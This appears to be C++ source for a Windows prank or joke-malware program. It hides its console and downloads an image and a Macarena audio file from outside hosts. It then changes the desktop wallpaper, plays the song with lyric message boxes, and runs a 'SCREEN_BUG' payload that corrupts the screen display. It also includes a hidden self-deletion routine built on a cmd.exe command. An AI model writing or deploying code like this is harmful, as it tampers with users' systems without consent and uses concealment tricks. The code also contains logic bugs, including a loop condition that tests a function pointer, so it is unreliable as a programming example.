#include <windows.h>
#include <assert.h>
#include <iostream>
#include <shlobj.h>
#include <time.h>
#include <cstdlib>
#include <stdio.h>
#include <io.h>
#include <string>
#include <sstream>
#include <thread>
#include <tlhelp32.h>
#include <strsafe.h>
#include <filesystem>
#include <vector>
#include <cassert>
#include <map>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "winmm")

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

/*
     Wallpaper -> 303791
     Macarena -> 40739508
*/

namespace std {
    LPWSTR toLPWSTR(std::string instr) {
        int bufferlen = ::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0);
        if (bufferlen == 0)
        {
            return 0;
        }
        LPWSTR widestr = new WCHAR[bufferlen + 1];
        ::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), widestr, bufferlen);
        widestr[bufferlen] = 0;
        return widestr;
    }
    inline std::wstring toWSTRING(std::string& s) {
        return std::wstring(s.begin(), s.end());
    }
}
namespace fileUtils {
    inline bool file_exists(const std::string& name) {
        struct stat buffer;
        return (stat(name.c_str(), &buffer) == 0);
    }
    long file_size(std::string filename)
    {
        struct stat stat_buf;
        int rc = stat(filename.c_str(), &stat_buf);
        return rc == 0 ? stat_buf.st_size : -1;
    }
    BOOL file_check(std::string file, long size) {
        if (file_exists(file) && size == file_size(file))
            return 1;
        return 0;
    }
}
namespace Memory {
    BOOL isProcessOpen(std::wstring name) {
        std::vector<DWORD> pids;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //all processes

        PROCESSENTRY32W entry; //current process
        entry.dwSize = sizeof entry;

        if (!Process32FirstW(snap, &entry)) { //start with the first in snapshot
            return 0;
        }

        do {
            if (std::wstring(entry.szExeFile) == name) {
                pids.emplace_back(entry.th32ProcessID); //name matches; add to list
            }
        } while (Process32NextW(snap, &entry));

        return (pids.size() != 0);
    }
}
namespace Payloads {
    std::vector<std::thread> payloadCoroutine;

    BOOL screen_bug = 0;
    void SCREEN_BUG() {
        while (TRUE) {
            if (screen_bug) {
                HDC dcDesktop = GetWindowDC(NULL);
                int scrX = GetSystemMetrics(SM_CXSCREEN);
                int scrY = GetSystemMetrics(SM_CYSCREEN);
                srand(GetTickCount());
                int x = rand() % scrX;
                for (;;)
                    if (screen_bug)
                        for (int y = scrY; y > 0; y--)
                            SetPixel(dcDesktop, x, y, GetPixel(dcDesktop, x, y - 3));
                Sleep(1);
            }
        }
    }

    void init() {
        payloadCoroutine.push_back(std::thread(SCREEN_BUG));
    }
}

std::string wallpaper = "C:\\Calbuuuus\\mauriescalboxdddddddCALBISIE.png";
std::string soundThing = "C:\\Calbuuuus\\yathusableeeemfskfmdsl.wav";

BOOL isMacarenaPlaying = 0;
std::vector<std::thread> coroutine;

void playMacarena() {
    isMacarenaPlaying = 1;
    PlaySound(std::toLPWSTR(soundThing), NULL, SND_SYNC);
    isMacarenaPlaying = 0;
}
int uKnow = 0;
namespace Lyrics {
    std::map<int, LPCSTR> songLyrics;
    LPCSTR lyric = NULL;
    void coroutineLyricsBox() {
        MessageBoxA(NULL, lyric, "Lyrics", NULL);
    }
    inline void lyricsBox(std::string lyrics) {
        coroutine.push_back(std::thread(&coroutineLyricsBox));
    }
    BOOL doesLyricsExists(int x0) {
        if (songLyrics.find(x0) != songLyrics.end())
            return 1;
        return 0;
    }
    void addLyric(int x0, LPCSTR x1) {
        if (!doesLyricsExists(x0))
            songLyrics[x0] = x1;
    }
    void doLyric(int x0) {
        
        if (doesLyricsExists(x0-1)) {
            lyric = songLyrics[x0-1];
            lyricsBox(songLyrics[x0-1]);
        }
    }
    void initLyrics() {
        addLyric(370,"When I dance they call me Macarena");
        addLyric(395,"And the boys they say me que estoy buena");
        addLyric(420,"They all want me, they can't have me");
        addLyric(442,"So they all come and dance beside me");
        addLyric(469,"Move with me, chant with me");
        addLyric(490,"And if you're good I'll take you home with me");
        addLyric(509,"Dale a tu cuerpo alegría Macarena");
        addLyric(530,"Que tu cuerpo es pa' darle alegria y cosa buena");
        addLyric(560,"Dale a tu cuerpo alegría Macarena");
        addLyric(580,"Heee");
        addLyric(583, "Heee");
        addLyric(584, "Heee");
        addLyric(585, "Heee");
        addLyric(586, "Heee");
        addLyric(587, "Heee");
        addLyric(588, "Heee");
        addLyric(589, "Heey");
        addLyric(590, "Macarena");
        addLyric(605, "Dale a tu cuerpo alegría Macarena");
        addLyric(620, "Que tu cuepo es pa' darle alegria y cosa buena");
        addLyric(651, "Dale a tu cuerpo alegría Macarena");
        addLyric(670, "Heee");
        addLyric(671, "Heee");
        addLyric(672, "Heee");
        addLyric(673, "Heee");
        addLyric(674, "Heee");
        addLyric(675, "Heee");
        addLyric(676, "Heee");
        addLyric(677, "Heee");
        addLyric(678, "Heee");
        addLyric(679, "Heee");
        addLyric(680, "Heee");
        addLyric(681, "Heey");
        addLyric(682, "Macarena");
        addLyric(685, "AAAAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHAAAAAAAAAAAAAAAAIIIIIIIIIII");
        addLyric(695, "Now don't you worry about my boyfriend");
        addLyric(712, "The boy whose name is Vitorino");
        addLyric(734, "I don't want him");
        addLyric(750, "Can't stand him");
        addLyric(765, "He was no good so, I ha");
        addLyric(785, "ha");
        addLyric(786, "ha");
        addLyric(787, "ha");
        addLyric(788, "ha");
        addLyric(789, "ha");
        addLyric(790, "ha");
        addLyric(791, "ha");
        addLyric(792, "ha");
        addLyric(793, "ha");
        addLyric(794, "ha");
        addLyric(795, "ha");
        addLyric(796, "ha");
        addLyric(797, "ha");
        addLyric(798, "ha");
        addLyric(799, "ha");
        addLyric(800, "ha");
        addLyric(801, "ha");
        addLyric(802, "ha");
        addLyric(803, "ha");
        addLyric(804, "Now come on, what was I supposed to do?\nHe was out of town and his two friends were so fine");
    }
}

int main()
{
    Payloads::init();
    Lyrics::initLyrics();
    std::thread currentThread;
    FreeConsole();
    system("md C:\\Calbuuuus");
    /* Download required files for running. */
    LPCSTR wpDlWebsite = "https://i.imgur.com/EFRtiJK.png";
    if (!fileUtils::file_check(wallpaper, 303791)) {
        Sleep(50);
        URLDownloadToFileA(NULL, wpDlWebsite, wallpaper.c_str(), 0, NULL);
    }
    wpDlWebsite = "https://download947.mediafire.com/0ty3stzmvpcg/nfbz2ppyoqklqz6/macarena-1996-high-quality-audio.wav";
    if (!fileUtils::file_check(soundThing, 40739508)) {
        Sleep(50);
        URLDownloadToFileA(NULL, wpDlWebsite, soundThing.c_str(), 0, NULL);
    }
    Sleep(100);
    currentThread = std::thread(playMacarena);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wallpaper), SPIF_UPDATEINIFILE);
    
    while (playMacarena) {
        Lyrics::doLyric(uKnow);
        const char * uKnowChar = std::to_string(uKnow).c_str();
        Payloads::screen_bug = 1;
        uKnow++;
        Sleep(100);
    }
    return 0;
}